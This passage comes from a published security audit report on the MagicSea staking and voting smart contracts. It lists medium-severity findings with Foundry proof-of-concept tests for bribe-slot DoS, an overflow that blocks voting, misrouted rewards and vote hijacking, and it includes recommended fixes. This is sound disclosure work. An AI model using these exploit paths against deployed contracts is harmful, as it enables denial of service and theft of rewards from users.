        BribeRewarder rewarder2 = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(customNoValueToken, pool))));
        customNoValueToken.approve(address(rewarder2), type(uint256).max);
        rewarder2.fundAndBribe(1, 100, 100e18);

        BribeRewarder rewarder3 = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(customNoValueToken, pool))));
        customNoValueToken.approve(address(rewarder3), type(uint256).max);
        rewarder3.fundAndBribe(1, 100, 100e18);

        BribeRewarder rewarder4 = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(customNoValueToken, pool))));
        customNoValueToken.approve(address(rewarder4), type(uint256).max);
        rewarder4.fundAndBribe(1, 100, 100e18);
        vm.stopPrank();

        vm.startPrank(tom);
        BribeRewarder rewarderReal = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(bribeRewardToken, pool))));
        bribeRewardToken.mint(tom, 100_000e6);
        bribeRewardToken.approve(address(rewarderReal), type(uint256).max);
        customNoValueToken.approve(address(rewarderReal), type(uint256).max);
        vm.expectRevert(bytes("too much bribes"));
        rewarderReal.fundAndBribe(2, 6, 20_000e6);
        vm.stopPrank();
    }
```

To run the test use: ``forge test -vvv --mt test_BrickRewardBribers``

## Impact
A malicious actor can dos the adding of ``BribeRewarder.sol`` contract instances for specific pools, and thus either make ``Voter.sol`` and ``BribeRewarders.sol`` contracts obsolete, or prevent the addition of genuine ``BribeRewarder.sol`` contract instances for a specific project which he sees as a competitor. I believe this vulnerability is of high severity as it severely restricts the availability of the main functionality of the ``Voter.sol`` and ``BribeRewarders.sol`` contracts.

## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L130-L144

## Tool used
Manual Review & Foundry

## Recommendation
Consider creating a functionality that whitelists only previously verified owner of pools, or people that really intend to distribute rewards to voters, and allow only them to add ``BribeRewarders.sol`` contracts instances for the pool they are whitelisted for. 



## Discussion

**0xSmartContract**

In `Voter.sol` and `BribeRewarders.sol` contracts, a maximum of 5  `BribeRewarder.sol` contracts are allowed per pool and these can be added without permission. 
A malicious actor could use worthless tokens to fill this limit, preventing real rewards from being added. This results in user incentives being ineffective and the voting system becoming dysfunctional. 

# Issue M-6: Rewards might get stuck when approved actor renews a position 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/207 

## Found by 
0xAnmol, BlockBusters, ChinmayF, HonorLt, ydlee
## Summary

When an approved actor calls the harvest function, the rewards get sent to the user (staker). However, when the approved actor renews the user’s position, they receive the rewards instead.

If the approved actor is a smart contract (e.g., a keeper), the funds might get stuck forever or go to the wrong user, such as a Chainlink keeper.

## Vulnerability Detail

Suppose Alice mints an NFT by creating a position and approves Bob to use it.

- When Bob calls `harvestPosition` with Alice’s `tokenId`, Alice will receive the rewards (as intended)
- When Bob calls `renewLockPosition` with Alice’s `tokenId`, Bob will receive the rewards. The internal function `_lockPosition`, which is called by `renewLockPosition`, also harvests the position before updating the lock duration. Unlike the harvest function, `_lockPosition` [sends the rewards to `msg.sender`](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L710) instead of the token owner.

This bug exists in both `renewLockPosition` and `extendLockPosition`, as they both call `_lockPosition`, which includes the wrong receiver.

### PoC

To run this test, add it into `MlumStaking.t.sol`.

```solidity
function testVuln_ApprovedActorReceivesRewardsWhenRenewingPosition() public {
    // setup pool
    uint256 _amount = 100e18;
    uint256 lockTime = 1 days;

    _rewardToken.mint(address(_pool), 100_000e6);
    _stakingToken.mint(ALICE, _amount);

    // alice creates new position
    vm.startPrank(ALICE);
    _stakingToken.approve(address(_pool), _amount);
    _pool.createPosition(_amount, lockTime);
    vm.stopPrank();

    // alice approves bob
    vm.prank(ALICE);
    _pool.approve(BOB, 1);

    skip(1 hours);

    // for simplicity of the PoC we use a static call
    // IMlumStaking doesn't include `renewLockPosition(uint256)`
    uint256 bobBefore = _rewardToken.balanceOf(BOB);
    vm.prank(BOB);
    address(_pool).call(abi.encodeWithSignature("renewLockPosition(uint256)", 1));

    // Bob receivew the rewards, instead of alice
    assertGt(_rewardToken.balanceOf(BOB), bobBefore);
}
```

## Impact

Possible loss of reward tokens

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L710

## Tool used

Manual Review, Foundry

## Recommendation

Change `_lockPosition()` in `MlumStaking.sol`  to use the owner of the position instead of `msg.sender`.

```solidity
function _lockPosition(uint256 tokenId, uint256 lockDuration, bool resetInitial) internal {
    ...
-   _harvestPosition(tokenId, msg.sender);
+   _harvestPosition(tokenId, _ownerOf(tokenId));
    ...
}
```



## Discussion

**0xSmartContract**

Calling the `renewLockPosition` and `extendLockPosition` functions may result in rewards being sent to the wrong address.

When an approved actor calls the `renewLockPosition` or `extendLockPosition` functions, the rewards go to the approved actor who made the call, not the Position Owner.

**0xHans1**

PR: https://github.com/metropolis-exchange/magicsea-staking/pull/8


**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/8


# Issue M-7: Attacker can block all votes to a specific pool by triggering an overflow error 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/237 

## Found by 
santipu\_
## Summary

An attacker can deploy a `BribeRewarder` contract using a custom token and distribute a huge number of those tokens to trigger an overflow error and prevent users from voting in a specific pool.

## Vulnerability Detail

In the MagicSea protocol, bribing is a core mechanism. In short, users can permissionlessly create `BribeRewarder` contracts and fund them with tokens to bribe users in exchange for voting in specific pools. 

When users vote for a specific pool through calling `Voter::vote`, the function `_notifyBribes` is called, which calls each `BribeRewarder` contract that is attached to that voted pool:

```solidity
function _notifyBribes(uint256 periodId, address pool, uint256 tokenId, uint256 deltaAmount) private {
    IBribeRewarder[] storage rewarders = _bribesPerPriod[periodId][pool];
    for (uint256 i = 0; i < rewarders.length; ++i) {
        if (address(rewarders[i]) != address(0)) {
>>>         rewarders[i].deposit(periodId, tokenId, deltaAmount);
            _userBribesPerPeriod[periodId][tokenId].push(rewarders[i]);
        }
    }
}
```

An attacker can use this bribing mechanism to create malicious `BribeRewarder` contracts that will revert the transaction each time a user tries to vote for a specific pool. The attack path is the following:

1. An attacker creates a custom token and mints the maximum amount of tokens (`type(uint256).max`).
2. The attacker creates a `BribeRewarder` contract using the custom token.
3. The attacker transfers the total supply of the token to the rewarder contracts and sets it up to distribute the whole supply only in one period to a specific pool.
4. When that period starts, the attacker first uses 1 wei to vote for the selected pool, which will initialize the value of `accDebtPerShare` to a huge value.
5. When other legitimate users go to vote to that same pool, the transaction will revert due to overflow.

In step 4, the attacker votes using 1 wei to initialize `accDebtPerShare` to a huge value, which will happen here:

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/libraries/Rewarder2.sol#L161
```solidity
    function updateAccDebtPerShare(Parameter storage rewarder, uint256 totalSupply, uint256 totalRewards)
        internal
        returns (uint256)
    {
        uint256 debtPerShare = getDebtPerShare(totalSupply, totalRewards);

        if (block.timestamp > rewarder.lastUpdateTimestamp) rewarder.lastUpdateTimestamp = block.timestamp;

>>     return debtPerShare == 0 ? rewarder.accDebtPerShare : rewarder.accDebtPerShare += debtPerShare;
    }

    function getDebtPerShare(uint256 totalDeposit, uint256 totalRewards) internal pure returns (uint256) {
>>     return totalDeposit == 0 ? 0 : (totalRewards << Constants.ACC_PRECISION_BITS) / totalDeposit;
    }
```

In the presented scenario, the value of `totalRewards` will be huge (close to `type(uint256).max`) and the value of `totalSupply` will only be 1, which will cause the `accDebtPerShare` ends up being a huge value. 

Later, when legitimate voters try to vote for that same pool, the transaction will revert due to overflow because the operation of `deposit * accDebtPerShare` will result in a value higher than `type(uint256).max`:

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/libraries/Rewarder2.sol#L27-L29
```solidity
function getDebt(uint256 accDebtPerShare, uint256 deposit) internal pure returns (uint256) {
    return (deposit * accDebtPerShare) >> Constants.ACC_PRECISION_BITS;
}
```

## Impact

By executing this sequence, an attacker can block all votes to specific pools during specific periods. If wanted, an attacker could block ALL votes to ALL pools during ALL periods, and the bug can only be resolved by upgrading the contracts or deploying new ones. 

There aren't any external requirements or conditions for this attack to be executed, which means that the voting functionality can be gamed or completely hijacked at any point in time. 

## PoC

The following PoC can be pasted in the file called `BribeRewarder.t.sol` and can be executed by running the command `forge test --mt testOverflowRewards`.

```solidity
function testOverflowRewards() public {
    // Create custom token
    IERC20 customRewardToken = IERC20(new ERC20Mock("Custom Reward Token", "CRT", 18));

    // Create rewarder with custom token
    rewarder = BribeRewarder(payable(address(factory.createBribeRewarder(customRewardToken, pool))));

    // Mint the max amount of custom token to rewarder
    ERC20Mock(address(customRewardToken)).mint(address(rewarder), type(uint256).max);

    // Start bribes
    rewarder.bribe(1, 1, type(uint256).max);

    // Start period
    _voterMock.setCurrentPeriod(1);
    _voterMock.setStartAndEndTime(0, 2 weeks);

    vm.warp(block.timestamp + 10);

    // Vote with 1 wei to initialize `accDebtPerShare` to a huge value
    vm.prank(address(_voterMock));
    rewarder.deposit(1, 1, 1);

    vm.warp(block.timestamp + 1 days);

    // Try to vote with 1e18 -- It overflows
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1e18);

    // Try to vote with 1e15 -- Still overflowing
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1e15);

    // Try now for a bigger vote -- Still overflowing
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1_000e18);
}
```

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/libraries/Rewarder2.sol#L28

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to create a whitelist of tokens that limits the tokens that can be used as rewards for bribing. This way, users won't be able to distribute a huge amount of tokens and block all the voting mechanisms. 




## Discussion

**0xSmartContract**

As a result of detailed analysis with LSW, the issue was determined as Medium.



The critical function is `_notifyBribes` in the `Voter` contract, which calls the `deposit` function in `BribeRewarder` contracts.

 An attacker can create a custom token with a maximum supply and distribute it to a `BribeRewarder` contract, leading to an overflow when legitimate users try to vote.

- The PoC correctly sets up the scenario where an overflow error can occur. The critical part of the PoC is the initialization of `accDebtPerShare` with a large value.
- LSW mentioned that the PoC as provided might have issues, and suggest changing `uint256` to `uint192` for it to work correctly. This change makes sense as it ensures the `accDebtPerShare` calculation does not overflow.



1. **`_notifyBribes()`**

   ```js
   function _notifyBribes(uint256 periodId, address pool, uint256 tokenId, uint256 deltaAmount) private {
       IBribeRewarder[] storage rewarders = _bribesPerPriod[periodId][pool];
       for (uint256 i = 0; i < rewarders.length; ++i) {
           if (address(rewarders[i]) != address(0)) {
               rewarders[i].deposit(periodId, tokenId, deltaAmount);
               _userBribesPerPeriod[periodId][tokenId].push(rewarders[i]);
           }
       }
   }
   ```

This function loops through `BribeRewarder` contracts and calls the `deposit` function.

 2. **`updateAccDebtPerShare()`**
   ```js
   function updateAccDebtPerShare(Parameter storage rewarder, uint256 totalSupply, uint256 totalRewards)
       internal
       returns (uint256)
   {
       uint256 debtPerShare = getDebtPerShare(totalSupply, totalRewards);

       if (block.timestamp > rewarder.lastUpdateTimestamp) rewarder.lastUpdateTimestamp = block.timestamp;

       return debtPerShare == 0 ? rewarder.accDebtPerShare : rewarder.accDebtPerShare += debtPerShare;
   }

   function getDebtPerShare(uint256 totalDeposit, uint256 totalRewards) internal pure returns (uint256) {
       return totalDeposit == 0 ? 0 : (totalRewards << Constants.ACC_PRECISION_BITS) / totalDeposit;
   }
   ```
- The `getDebtPerShare` function can produce a large value if `totalDeposit` is very small (e.g., 1 wei) and `totalRewards` is very large (`type(uint256).max`).
   - This large value can then cause overflow in subsequent calculations in `updateAccDebtPerShare`.

3. **`getDebt()`**
   ```js
   function getDebt(uint256 accDebtPerShare, uint256 deposit) internal pure returns (uint256) {
       return (deposit * accDebtPerShare) >> Constants.ACC_PRECISION_BITS;
   }
   ```

This function performs the multiplication that can overflow if `accDebtPerShare` is too large.


# Issue M-8: DoS of `Voter.sol#createFarms()` due to incorrect validation of `MasterchefV2.sol#add()` function 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/261 

## Found by 
0xAsen, 0xWhitehat, BengalCatBalu, DPS, Honour, KupiaSec, Reentrants, Silvermist, TessKimy, araj, bbl4de, blockchain555, radin200, scammed, utsav
## Summary
Because the `MasterchefV2.sol#add()` function only checks whether the caller is `_lbHooksManager`, `_operator` or owner of the `MasterchefV2` contract, the `Voter.sol#createFarms()` function is reverted.
## Vulnerability Detail
The `MasterchefV2.sol#add()` function checks whether the caller is `_lbHooksManager`, `_operator` or owner of the `MasterchefV2` contract.
```solidity
    function add(IERC20 token, IMasterChefRewarder extraRewarder) external override {
368:    if (msg.sender != address(_lbHooksManager)) _checkOwnerOrOperator();

        //_checkOwner(); // || msg.sender != address(_voter)

        uint256 pid = _farms.length;

        Farm storage farm = _farms.push();

        farm.token = token;
        farm.rewarder.lastUpdateTimestamp = block.timestamp;

        if (address(extraRewarder) != address(0)) _setExtraRewarder(pid, extraRewarder);

        token.balanceOf(address(this)); // sanity check

        emit FarmAdded(pid, token);
    }
```
Meanwhile, let's look in detail at the roles that can call the `MasterchefV2.sol#add()` function.
    > Lb hooks manager: Contract creating hooks for liquidity pairs and is part of the concentrated liquidity rewarding
    > Operator : The trusted wallet for keeper actions. the idea is that after the voting period a keeper adds missing farms for pools which had votes
    > Owner : The deployer of the Contract
As you can see, these roles are not the voter.
However, the `Voter` contract calls the `createFarms()` function to create a farm.
```solidity
    function createFarms(address[] calldata pools) external onlyOwner {
        uint256 farmLengths = _masterChef.getNumberOfFarms();
        uint256 minimumVotes = _minimumVotesPerPool;
        for (uint256 i = 0; i < pools.length; ++i) {
            if (_votes.get(pools[i]) >= minimumVotes && !hasFarm(pools[i], farmLengths)) {
236:            _masterChef.add(IERC20(pools[i]), IMasterChefRewarder(address(0)));
            }
        }
    }
```
As a result, the `createFarms()` function is reverted and the protocol cannot create a farm.
## Impact
The protocol cannot create a farm.
## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L231-L239
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L367-L384
## Tool used

Manual Review

## Recommendation
Add a part to the `MasterchefV2.sol#add()` function to check whether the caller is a `voter`.
```solidity
    function add(IERC20 token, IMasterChefRewarder extraRewarder) external override {
---     if (msg.sender != address(_lbHooksManager)) _checkOwnerOrOperator();
+++     if (msg.sender != address(_lbHooksManager) || msg.sender != address(_voter)) _checkOwnerOrOperator();

        ...SNIP
    }
```



## Discussion

**0xSmartContract**

The `Voter.createFarms()` function works by calling the `MasterchefV2.add()` function.

However, the `MasterchefV2.add()` function can only be called by certain roles: `_lbHooksManager`, `_operator`, or `owner()`
When the `voter.createFarms()` function is not one of these roles, the function call will revert, causing the protocol to fail to create new farms

**0xHans1**

https://github.com/metropolis-exchange/magicsea-staking/pull/17

Function not needed anymore

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/17


# Issue M-9: Withdrawing a stake position will cause bribe rewards to be unclaimable 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/283 

## Found by 
PUSH0, PeterSR, Silvermist, aslanbek
## Summary

Each MLUM staking position is associated with a (non-transferrable) NFT, associated with one voting ballot. However withdrawing a stake position will burn the NFT, causing bribe rewards to be unclaimable.

## Vulnerability Detail

When users stake MLUM for at least a specified duration and a minimum amount threshold, they receive voting power to direct LUM incentives into LP pools. For each lock positions, a non-transferrable NFT is created.

When a user withdraws their position, the NFT corresponding to the position is burned.

```solidity
function _destroyPosition(uint256 tokenId) internal {
    // burn lsNFT
    delete _stakingPositions[tokenId];
    ERC721Upgradeable._burn(tokenId);
}
```

- Function `withdrawFromPosition()`: https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L496
- Internal function `_withdrawFromPosition()`: https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L643
- Internal function `_destroyPosition()`: https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L602

People can set up bribes to incentivize voters to vote into their pool. Voters who vote into "bribed" pools will earn bribe rewards. 

User can claim the bribe reward through the function `BribeRewarder.claim()`. It will then call into `_modify()`

```solidity
function claim(uint256 tokenId) external override {
    // ...
    for (uint256 i = _startVotingPeriod; i <= endPeriod; ++i) {
        totalAmount += _modify(i, tokenId, 0, true); // @audit this will have an ownership check
    }
    // ...
}
```

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L160

which has an NFT ownership check:

```solidity
function _modify(uint256 periodId, uint256 tokenId, int256 deltaAmount, bool isPayOutReward)
    private
    returns (uint256 rewardAmount)
{
    if (!IVoter(_caller).ownerOf(tokenId, msg.sender)) {
        revert BribeRewarder__NotOwner(); // @audit NFT ownership check will revert if NFT is burned
    }
    // ...
}
```

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L264-L266

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L402-L404

Therefore when a position is fully withdrawn, the bribe rewards became impossible to claim and will remain stuck in the contract.

## Impact

Fully withdrawing a stake position will cause bribe rewards to be unclaimable and remain stuck in the contract

## Code Snippet

When withdrawing, the position is destroyed and the NFT is burned: https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L602

When claiming, there is an ownership check: https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L264-L266

## Tool used

Manual Review

## Recommendation

When a position casts a vote, the `Voter` contract should record the owner at the time of voting. When the user wants to claim a reward, the ownership check should be that of the voter of that period.




## Discussion

**0xSmartContract**

Fully withdrawn a position will cause the NFT to be burned, resulting in the inability to claim bribe rewards. In this case, bribe rewards are stuck in the contract and cannot be used



 The `_destroyPosition` function destroys the position and burns the NFT.

 ```js
 function _destroyPosition(uint256 tokenId) internal {
 //burn lsNFT
 delete _stakingPositions[tokenId];
 ERC721Upgradeable._burn(tokenId);
 }
 ```

 The `BribeRewarder.claim()` function attempts to claim bribe rewards by calling the `_modify` function. However, the `_modify` function includes an NFT ownership check.

 ```js
 function claim(uint256 tokenId) external override {
 //...
 for (uint256 i = _startVotingPeriod; i <= endPeriod; ++i) {
 totalAmount += _modify(i, tokenId, 0, true); // @audit this will have an ownership check
 }
 //...
 }
 ```

In the `_modify` function, the `IVoter(_caller).ownerOf(tokenId, msg.sender)` statement checks the owner of the NFT and if the NFT does not exist (is `burned`) this check fails.

 ```js
 function _modify(uint256 periodId, uint256 tokenId, int256 deltaAmount, bool isPayOutReward)
 private
 returns (uint256 rewardAmount)
 {
 if (!IVoter(_caller).ownerOf(tokenId, msg.sender)) {
 revert BribeRewarder__NotOwner(); // @audit NFT ownership check will revert if NFT is burned
 }
 //...
 }
 ```

Therefore, when the NFT is burned after fully withdrawing the position, the user can no longer claim the bribe rewards because the ownership check fails. This results in rewards stuck in the contract.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/20


# Issue M-10: Voting and bribe rewards can be hijacked during emergency unlock by already existing positions 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/290 

## Found by 
ChinmayF, KupiaSec, PASCAL, Praise03, Reentrants, araj, aslanbek, bbl4de, chaduke, iamnmt, kmXAdam, krot-0025, pashap9990, radin200, robertodf, tedox
## Summary

There are many ways of modifying an already existing staking position : but they exhibit different behavior when an emergency unlock is made active.
`renewLock()` and `extendLock()` are straight away disallowed.
`withdrawFromPosition()` and `emergencyWithdraw()` are allowed but it can only pull out assets and not do anything else.

`addToPosition()` is a different case, it has no restrictions even when the emergency unlock is active. This can be used by an attacker to modify pre-existing position to vote with a new amount in Voter.

This is a big problem because all other ways of starting, or renewing a staking position are blocked.

## Vulnerability Detail

If a position already exists before the emergency unlock started, the owner of such positions can add amounts to them, and use this new amount for voting in the current voting period.

All other existing positions can also vote, but no new amount of assets can enter the voting circle because :

- calling createPosition will set lockDuration to 0 for this new position (which will revert when voting due to being < minimumLockTime) : see [here](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L356) and [here](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/Voter.sol#L172)
- calling renewLock and extendLock is straightaway [reverted](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L692).

Now because no new assets can enter the voting amount circulation during this period, this creates a monopoly for already existing positions to control the voting outcome with lesser participants on board.

This can be particularly used by an attacker to hijack the voting process in the following steps :

- If the attacker already knows the peculiarty of `addToPosition()`, they can plan in advance and open many many 1 wei staking positions with long lock duration (such that they are eligible for voting based on minimumLockTime etc. in Voter.sol) and wait for the emergency unlock.
- If the emergency unlock happens they suddenly start adding large amounts to their 1 wei positions.
- This increases their amountWithMultiplier(sure multiplier will get limited to 1x but we are talking about the amount itself) and thus they have more voting power.
- emergencyUnlock is meant to be used in an emergency which can happen anytime. If a voting period is running during that time, there is no way to stop the current voting period.
- The attacker can use this new voting power for all their positions to hijack the voting numbers because other users cant open new positions or renew/extend, and honest users are not aware of this loophole in the system via addToPosition()

In this way, an attacker can gain monopoly over the votes during an emergencyUnlock, which ultimately influences the LUM emissions directed to certain pools.

## Impact

Voting process can be manipulated during an emergencyUnlock using pre-existing positions. This also leads to a hijack of the bribe rewards if any bribe rewarders are set for those pools.

High severity because this can be used to unfairly influence the voting outcome and misdirect LUM rewards, which is the most critical property of the system. Also this is unfair to all other voters as they lose out on bribe rewards, and the attacker can get a very high share of it.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L397

## Tool used

Manual Review

## Recommendation

This can be solved by simply disallowing any activity apart from emregencyWithdraw during the time when emergencyUnlock is active. Apply the check used in [\_lockPosition()](https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L692) to addToPosition() too.



## Discussion

**0xSmartContract**

During emergency unlock, adding to existing positions can increase voting power and manipulate the voting process. This can unfairly affect voting outcomes and rewards.

**0xHans1**

PR: https://github.com/metropolis-exchange/magicsea-staking/pull/10

**0xSmartContract**

These issues all focus on how the system can be abused during emergency unlocking, which can have negative consequences for users and the contract. The main goal is to ensure that only safe and fair transactions are made during emergency unlocking, and to prevent malicious users from exploiting system vulnerabilities to gain unfair advantage.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/10


# Issue M-11: Inconsistent check in `harvestPositionsTo()` function 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/329 

## Found by 
AuditorPraise, BengalCatBalu, ChinmayF, Honour, Reentrants, Ryonen, bbl4de, blackhole, coffiasd, dany.armstrong90, minhquanym, novaman33, radin200, scammed, sh0velware
## Summary
Inconsistent check in `harvestPositionsTo()` function limits the ability of approved address to harvest on behalf of owner.

## Vulnerability Detail
In the function `harvestPositionsTo()`, function `_requireOnlyApprovedOrOwnerOf()` allows owner or approved address to harvest for the position.

However, the check `(msg.sender == tokenOwner && msg.sender == to)` only allowing the caller to be token owner. Thus these 2 checks are contradicted.
```solidity
function harvestPositionsTo(uint256[] calldata tokenIds, address to) external override nonReentrant {
    _updatePool();

    uint256 length = tokenIds.length;

    for (uint256 i = 0; i < length; ++i) {
        uint256 tokenId = tokenIds[i];
        _requireOnlyApprovedOrOwnerOf(tokenId);
        address tokenOwner = ERC721Upgradeable.ownerOf(tokenId);
        // if sender is the current owner, must also be the harvest dst address
        // if sender is approved, current owner must be a contract
        // @audit not consistent with _requireOnlyApprovedOrOwnerOf()
        require(
            (msg.sender == tokenOwner && msg.sender == to), // legacy || tokenOwner.isContract() 
            "FORBIDDEN"
        );

        _harvestPosition(tokenId, to);
        _updateBoostMultiplierInfoAndRewardDebt(_stakingPositions[tokenId]);
    }
}
```

## Impact
Contradictions in the function `harvestPositionsTo()`. Approved address cannot call `harvestPositionsTo()` on behalf of NFT owner.

## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L475-L484

## Tool used

Manual Review

## Recommendation
The intended check in function `harvestPositionsTo()` might be, changing `&&` to `||`
```diff
require(
-    (msg.sender == tokenOwner && msg.sender == to), // legacy || tokenOwner.isContract() 
+    (msg.sender == tokenOwner || msg.sender == to), // legacy || tokenOwner.isContract() 
    "FORBIDDEN"
);
```




## Discussion

**0xSmartContract**

Due to conflicting checks in the `harvestPositionsTo()` function, authorized addresses are prevented from harvesting on behalf of the NFT owner.

**0xHans1**

This was fixed during an other audit. add code comment to show the fix in the PR

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/23


# Issue M-12: Voters can claim their reward immediately in the end of epoch 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/346 

## Found by 
Reentrants, pashap9990
## Summary
[Based on docs](https://docs.magicsea.finance/protocol/magic/magic-lum-voting)
> Bribes as an additional incentive to vote <ins>can be claimed 24-48 hours after an epoch has ended</ins>. Voters can claim the rewards until the next epoch is ended. Unclaimed rewards will be sent back to the briber. 

Voters for claiming their reward have to call `BribeRewarder::claim` but in the implementation of this function doesn't have any restriction for apply this limitation
## Vulnerability Detail
add this function to Voter.t.sol and before that u have to change setUp function
```diff
+ RewarderFactory _rewardFactory;
function setUp()public {
...
+ address factoryImpl = address(new RewarderFactory());

+        _rewardFactory = RewarderFactory(
+           address(
+                new TransparentUpgradeableProxy2Step(
+                    factoryImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(RewarderFactory.initialize.selector, DEV, 
+ _rewardType, _rewarder)
+                )
+           )
+        );
```
```solidity
    function testClaimRewardsimmediately() public {
        ERC20Mock pool = new ERC20Mock("lp","LP", 18);
        ERC20Mock usdt = new ERC20Mock("USDT","USDT", 6);
        usdt.mint(address(this), 300e6);

        IBribeRewarder _bribeRewarder1 = _rewardFactory.createBribeRewarder(usdt, address(pool));
    
        _createPosition(ALICE);


        
        usdt.approve(address(_bribeRewarder1), 300e6);
        _bribeRewarder1.fundAndBribe(1, 3, 100e6);
        //start first epoch
        vm.prank(DEV);
        _voter.startNewVotingPeriod();
        address[] memory pools = new address[](1);
        pools[0] = address(pool);

        
        vm.prank(ALICE);
        _voter.vote(1, pools, _getDeltaAmounts());

        skip(14 days);
        //end of first epoch
        //start second epoch
        vm.prank(DEV);
        _voter.startNewVotingPeriod();

        vm.prank(ALICE);
        _bribeRewarder1.claim(1);
        assertGt(usdt.balanceOf(ALICE), 0);
    }
```

## Impact
Voters can claim their reward immediately in the end of epoch
## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L153
## Tool used

Manual Review

## Recommendation
```diff
function claim(uint256 tokenId) external override {
        uint256 endPeriod = IVoter(_caller).getLatestFinishedPeriod();//@audit voters can claim their rewards immeditly after end of epoch
+        (, uint256 endTime) = IVoter(_caller).getPeriodStartEndtime(endPeriod);
+        require(block.timestamp >= endTime + 2 days, "u can claim your reward after 2 days");

         uint256 totalAmount;
         ...
    }
```



## Discussion

**0xSmartContract**

It appears that the current code allows a reward to be claimed immediately at the end of the epoch, which prevents the expected behavior of claiming the reward 24-48 hours after the epoch ends. This vulnerability allows voters to receive their voting rewards earlier than they should.

# Issue M-13: Users can artificially create a voting ballot with 2 weeks `lockDuration`, effectively bypassing the 3-month limit 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/366 

## Found by 
PUSH0
## Summary

The requirements to be eligible for voting (as per the code comments) is that the user must hold a staking duration of at least 3 months, and the position is locked. The contract exposes several functions for the user to increase their lock positions.

We show the method to create a lock position with `initialLockDuration` to be 3 months, and `lockDuration` to be 2 weeks. The position can then effectively be re-locked for 2 weeks, and then vote as necessary for each period.

## Vulnerability Detail

The contract MLumStaking allows a user to stake their MLUM for voting power. The contract exposes two functions for extending their locking duration:
- `renewLockPosition()`, re-locks a position for exactly `_stakingPositions[tokenId].lockDuration`
- `extendLockPosition()`, extends a lock position by a user's choice of duration. The new duration must at least be as long as the position's initial lock duration.

The contract also exposes a function `addToPosition()`, which allows a user to add MLUM to a position. The position's lock duration is modified to the following [as per the docs](https://docs.magicsea.finance/protocol/magic/magic-lum-staking):

```txt
New Lock Time = (Remaining Lock Time * Staked MLUM Amount + MLUM Amount to add * Initial Lock Duration) / (MLUM Staked Amount + MLUM Amount to add)
```

```solidity
uint256 avgDuration = (remainingLockTime * position.amount + amountToAdd * position.initialLockDuration)
    / (position.amount + amountToAdd);

position.startLockTime = _currentBlockTimestamp();
position.lockDuration = avgDuration;
```

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L410-L411

A user can use this mechanism to their advantage to craft a position with an initial lock duration of 3 months but a `lockDuration` of 2 weeks using the following method:
- First, the user locks their desired amount of MLUM for 3 months. Let's assume it's 50 MLUM, the minimum amount required for voting
